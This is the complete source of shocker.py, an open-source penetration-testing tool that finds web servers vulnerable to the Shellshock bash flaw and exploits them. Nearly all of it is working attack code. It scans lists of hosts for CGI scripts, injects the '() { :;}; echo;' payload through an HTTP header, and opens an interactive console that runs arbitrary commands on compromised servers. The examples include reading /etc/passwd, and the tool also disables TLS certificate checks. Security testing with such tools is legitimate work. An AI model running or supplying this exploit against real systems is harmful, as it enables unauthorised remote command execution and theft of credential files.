#!/usr/bin/env python

"""
shocker.py v1.0
A tool to find and exploit webservers vulnerable to Shellshock

##############################################################################
# Released as open source by NCC Group Plc - http://www.nccgroup.com/        #
#                                                                            #
# Developed by Tom Watson, tom.watson@nccgroup.trust                         #
#                                                                            #
# https://www.github.com/nccgroup/shocker                                    #
#                                                                            #
# Released under the GNU Affero General Public License                       #
# (https://www.gnu.org/licenses/agpl-3.0.html)                               #
##############################################################################

Usage examples:
./shocker.py -H 127.0.0.1 -e "/bin/cat /etc/passwd" -c /cgi-bin/test.cgi
Scans for http://127.0.0.1/cgi-bin/test.cgi and, if found, attempts to cat
/etc/passwd

./shocker.py -H www.example.com -p 8001 -s
Scan www.example.com on port 8001 using SSL for all scripts in cgi_list and
attempts the default exploit for any found

./shocker.py -f iplist
Scans all hosts specified in the file ./iplist with default options

Read the README for more details
"""

import urllib2
import argparse
import string
import StringIO
import random
import signal
import sys
import socket
import Queue
import threading
import re
from collections import OrderedDict

from sys import version_info

# SSL FIX
if version_info >= (2, 7, 9):
    import ssl
    ssl._create_default_https_context = ssl._create_unverified_context

# Wrapper object for sys.sdout to elimate buffering
# (https://stackoverflow.com/questions/107705/python-output-buffering)
class Unbuffered(object):
    def __init__(self, stream):
        self.stream = stream
    def write(self, data):
        self.stream.write(data)
        self.stream.flush()
    def __getattr__(self, attr):
        return getattr(self.stream, attr)

# Wrap std.out in Unbuffered
sys.stdout = Unbuffered(sys.stdout)


# User-agent to use instead of 'Python-urllib/2.6' or similar
user_agent = "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0)"

# Handle CTRL-c elegently
def signal_handler(signal, frame):
    """ Try to catch and respond to CTRL-Cs
    """

    sys.exit(0)

# Timeout for urllib2.urlopen requests
TIMEOUT = 5

def check_hosts(host_target_list, port, verbose):
    """ Do some basic sanity checking on hosts to make sure they resolve
    and are currently reachable on the specified port(s)
    """

    counter = 0
    number_of_targets = len (host_target_list)
    confirmed_hosts = [] # List of resoveable and reachable hosts
    if number_of_targets > 1:
        print "[+] Checking connectivity to targets..."
    else:
        print "[+] Checking connectivity with target..."
    for host in host_target_list:
        counter += 1
        # Show a progress bar unless verbose or there is only 1 host
        if not verbose and number_of_targets > 1:
            print_progress(number_of_targets, counter)

        try:
            if verbose: print "[I] Checking to see if %s resolves..." % host
            ipaddr = socket.gethostbyname(host)
            if verbose: print "[I] Resolved ok"
            if verbose: print "[I] Checking to see if %s is reachable on port %s..." % (host, port)
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(5.0)
            s.connect((ipaddr, int(port)))
            s.close()
            if verbose: print "[I] %s seems reachable..." % host
            confirmed_hosts.append(host)
        except Exception as e:
            print "[!] Exception - %s: %s" % (host, e)
            print "[!] Omitting %s from target list..." % host
    if len(host_target_list) > 1:
        print "[+] %i of %i targets were reachable" % \
                            (len(confirmed_hosts), number_of_targets)
    elif len(confirmed_hosts) == 1:
        print "[+] Target was reachable"
    else:
        print "[+] Host unreachable"
    return confirmed_hosts


def scan_hosts(protocol, host_target_list, port, cgi_list, proxy, verbose):
    """ Go through each potential cgi in cgi_list spinning up a thread for each
    check. Create Request objects for each check.
    """

    # List of potentially epxloitable URLs
    exploit_targets = []
    cgi_num = len(cgi_list)
    q = Queue.Queue()
    threads = []

    for host in host_target_list:
        print "[+] Looking for vulnerabilities on %s:%s" % (host, port)
        cgi_index = 0
        for cgi in cgi_list:
            cgi_index += 1

            # Show a progress bar unless verbose or there is only 1 cgi
            if not verbose and cgi_num > 1: print_progress(cgi_num, cgi_index)

            try:
                req = urllib2.Request(protocol + "://" + host + ":" + port + cgi)
                url = req.get_full_url()
                if proxy:
                    req.set_proxy(proxy, "http")

                # Pretend not to be Python for no particular reason
                req.add_header("User-Agent", user_agent)

                # Set the host header correctly (Python includes :port)
                req.add_header("Host", host)

                thread_pool.acquire()

                # Start a thread for each CGI in cgi_list
                if verbose: print "[I] Starting thread %i" % cgi_index
                t = threading.Thread(target = do_check_cgi, args = (req, q, verbose))
                t.start()
                threads.append(t)
            except Exception as e:
                if verbose: print "[I] %s - %s" % (url, e)
            finally:
                pass

        # Wait for all the threads to finish before moving on
        for thread in threads:
            thread.join()

        # Pop any results from the Queue and add them to the list of potentially
        # exploitable urls (exploit_targets) before returning that list
        while not q.empty():
            exploit_targets.append(q.get())

    if verbose: print "[+] Finished host scan"
    return exploit_targets

def do_check_cgi(req, q, verbose):
    """ Worker thread for scan_hosts to check if url is reachable
    """

    try:
        if urllib2.urlopen(req, None, TIMEOUT).getcode() == 200:
            q.put(req.get_full_url())
    except Exception as e:
        if verbose: print "[I] %s for %s" % (e, req.get_full_url())
    finally:
        thread_pool.release()

def do_exploit_cgi(proxy, target_list, command, verbose):
    """ For urls identified as potentially exploitable attempt to exploit
    """

    # Flag used to identify whether the exploit has successfully caused the
    # server to return a useful response
    success_flag = ''.join(
        random.choice(string.ascii_uppercase + string.digits
        ) for _ in range(20))

    # Dictionary {header:attack string} to try on discovered CGI scripts
    # Where attack string comprises exploit + success_flag + command
    attacks = {
       "Content-type": "() { :;}; echo; "
       }

    # A dictionary of apparently successfully exploited targets
    # {url: (header, exploit)}
    # Returned to main()
    successful_targets = OrderedDict()

    if len(target_list) > 1:
        print "[+] %i potential targets found, attempting exploits" % len(target_list)
    else:
        print "[+] 1 potential target found, attempting exploits"
    for target in target_list:
        if verbose: print "[+] Trying exploit for %s" % target
        if verbose: print "[I] Flag set to: %s" % success_flag
        for header, exploit in attacks.iteritems():
            attack = exploit + " echo " + success_flag + "; " + command
            result = do_attack(proxy, target, header, attack, verbose)
            if success_flag in result:
                if verbose:
                    print "[!] %s looks vulnerable" % target
                    print "[!] Response returned was:"
                    buf = StringIO.StringIO(result)
                    if len(result) > (len(success_flag)):
                        for line in buf:
                            if line.strip() != success_flag:
                                print "  %s" % line.strip()
                    else:
                        print "[!] A result was returned but was empty..."
                        print "[!] Maybe try a different exploit command?"
                    buf.close()
                successful_targets.update({target: (header, exploit)})
            else:
                if verbose: print "[-] Not vulnerable"
    return successful_targets


def do_attack(proxy, target, header, attack, verbose):
    result = ""
    host = target.split(":")[1][2:] # substring host from target URL

    try:
        if verbose:
            print "[I] Header is: %s" % header
            print "[I] Attack string is: %s" % attack
        req = urllib2.Request(target)
        req.add_header(header, attack)
        if proxy:
            req.set_proxy(proxy, "http")
            if verbose: print "[I] Proxy set to: %s" % str(proxy)
        req.add_header("User-Agent", user_agent)
        req.add_header("Host", host)
        resp = urllib2.urlopen(req, None, TIMEOUT)
        result =  resp.read()
    except Exception as e:
        if verbose: print "[I] %s - %s" % (target, e)
    finally:
        pass
    return result

def ask_for_console(proxy, successful_targets, verbose):
    """ With any discovered vulnerable servers asks user if they
    would like to choose one of these to send further commands to
    in a semi interactive way
    successful_targets is a dictionary:
    {url: (header, exploit)}
    """

    # Initialise to non zero to enter while loop
    user_input = 1
    ordered_url_list = successful_targets.keys()

    while user_input is not 0:
        result = ""
        print "[+] The following URLs appear to be exploitable:"
        for x in range(len(ordered_url_list)):
            print "  [%i] %s" % (x+1, ordered_url_list[x])
        print "[+] Would you like to exploit further?"
        user_input = raw_input("[>] Enter an URL number or 0 to exit: ")
        sys.stdout.flush()
        try:
            user_input = int(user_input)
        except:
            continue
        if user_input not in range(len(successful_targets)+1):
            print "[-] Please enter a number between 1 and %i (0 to exit)" % \
                                                            len(successful_targets)
            continue
        elif not user_input:
            continue
        target = ordered_url_list[user_input-1]
        header = successful_targets[target][0]
        print "[+] Entering interactive mode for %s" % target
        print "[+] Enter commands (e.g. /bin/cat /etc/passwd) or 'quit'"

        while True:
            command = ""
            result = ""
            sys.stdout.flush()
            command = raw_input("  > ")
            sys.stdout.flush()
            if command == "quit":
                sys.stdout.flush()
                print "[+] Exiting interactive mode..."
                sys.stdout.flush()
                break
            if command:
                attack = successful_targets[target][1] + command
                result = do_attack(proxy, target, header, attack, verbose)
            else:
                result = ""
            if result:
                buf = StringIO.StringIO(result)
                for line in buf:
                    sys.stdout.flush()
                    print "  < %s" % line.strip()
                    sys.stdout.flush()
            else:
                sys.stdout.flush()
                print "  > No response"
                sys.stdout.flush()


def validate_address(hostaddress):
    """ Attempt to identify if proposed host address is invalid by matching
    against some very rough regexes """

    singleIP_pattern = re.compile('^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$')
    FQDN_pattern = re.compile('^(\w+\.)*\w+$')
    if singleIP_pattern.match(hostaddress) or FQDN_pattern.match(hostaddress):
        return True
    else:
        print "Host %s appears invalid, exiting..." % hostaddress
        exit(0)


def get_targets_from_file(file_name):
    """ Import targets to scan from file
    """

    host_target_list = []
    with open(file_name, 'r') as f:
        for line in f:
            line = line.strip()
            if not line.startswith('#') and validate_address(line):
                host_target_list.append(line)
    print "[+] %i hosts imported from %s" % (len(host_target_list), file_name)
    return host_target_list


def import_cgi_list_from_file(file_name):
    """ Import CGIs to scan from file
    """

    cgi_list = []
    with open(file_name, 'r') as f:
        for line in f:
            if not line.startswith('#'):
                cgi_list.append(line.strip())
    print "[+] %i potential targets imported from %s" % (len(cgi_list), file_name)
    return cgi_list


def print_progress(
                total,
                count,
                lbracket = "[",
                rbracket = "]",
                completed = ">",
                incomplete = "-",
                bar_size  = 50
                ):
    percentage_progress = (100.0/float(total))*float(count)
    bar = int(bar_size * percentage_progress/100)
    print lbracket + completed*bar + incomplete*(bar_size-bar) + rbracket + \
        " (" + str(count).rjust(len(str(total)), " ") + "/" + str(total) + ")\r",
    if percentage_progress == 100: print "\n"


def main():
    print """
   .-. .            .
  (   )|            |
   `-. |--. .-.  .-.|.-. .-. .--.
  (   )|  |(   )(   |-.'(.-' |
   `-' '  `-`-'  `-''  `-`--''  v1.0

 Tom Watson, tom.watson@nccgroup.trust
 https://www.github.com/nccgroup/shocker

 Released under the GNU Affero General Public License
 (https://www.gnu.org/licenses/agpl-3.0.html)

    """

    # Handle CTRL-c elegently
    signal.signal(signal.SIGINT, signal_handler)

    # Handle command line argumemts
    parser = argparse.ArgumentParser(
        description='A Shellshock scanner and exploitation tool',
        epilog='Examples of use can be found in the README'
        )
    targets = parser.add_mutually_exclusive_group(required=True)
    targets.add_argument(
        '--Host',
        '-H',
        type = str,
        help = 'A target hostname or IP address'
        )
    targets.add_argument(
        '--file',
	'-f',
        type = str,
        help = 'File containing a list of targets'
        )
    cgis = parser.add_mutually_exclusive_group()
    cgis.add_argument(
        '--cgilist',
        type = str,
        default = './shocker-cgi_list',
        help = 'File containing a list of CGIs to try'
        )
    cgis.add_argument(
        '--cgi',
        '-c',
        type = str,
        help = "Single CGI to check (e.g. /cgi-bin/test.cgi)"
        )
    parser.add_argument(
        '--port',
        '-p',
        default = 80,
        type = int,
        help = 'The target port number (default=80)'
        )
    parser.add_argument(
        '--command',
        default = "/bin/uname -a",
        help = "Command to execute (default=/bin/uname -a)"
        )
    parser.add_argument(
        '--proxy',
        help = "*A BIT BROKEN RIGHT NOW* Proxy to be used in the form 'ip:port'"
        )
    parser.add_argument(
        '--ssl',
        '-s',
        action = "store_true",
        default = False,
        help = "Use SSL (default=False)"
        )
    parser.add_argument(
        '--threads',
        '-t',
        type = int,
        default = 10,
        help = "Maximum number of threads (default=10, max=100)"
        )
    parser.add_argument(
        '--verbose',
        '-v',
        action = "store_true",
        default = False,
        help = "Be verbose in output"
        )
    args = parser.parse_args()

    # Assign options to variables
    if args.Host:
        host_target_list = [args.Host]
    else:
        host_target_list = get_targets_from_file(args.file)
    if not len(host_target_list) > 0:
        print "[-] No valid targets provided, exiting..."
        exit (0)
    port = str(args.port)
    if args.proxy is not None:
        proxy = args.proxy
    else:
        proxy = ""
    verbose = args.verbose
    command = args.command
    if args.ssl == True or port == "443":
        protocol = "https"
    else:
        protocol = "http"
    global thread_pool
    if args.threads > 100:
        print "Maximum number of threads is 100"
        exit(0)
    else:
        thread_pool = threading.BoundedSemaphore(args.threads)
    if args.cgi is not None:
        cgi_list = [args.cgi]
        print "[+] Single target '%s' being used" % cgi_list[0]
    else:
        cgi_list = import_cgi_list_from_file(args.cgilist)

    # Check hosts resolve and are reachable on the chosen port
    confirmed_hosts = check_hosts(host_target_list, port, verbose)

    # Go through the cgi_list looking for any present on the target host
    target_list = scan_hosts(protocol, confirmed_hosts, port, cgi_list, proxy, verbose)

    # If any cgi scripts were found on the target host try to exploit them
    if len(target_list):
        successful_targets = do_exploit_cgi(proxy, target_list, command, verbose)
        if len(successful_targets):
            ask_for_console(proxy, successful_targets, verbose)
        else:
            print "[-] All exploit attempts failed"
    else:
        print "[+] No targets found to exploit"

__version__ = '1.0'
if __name__ == '__main__':
    main()
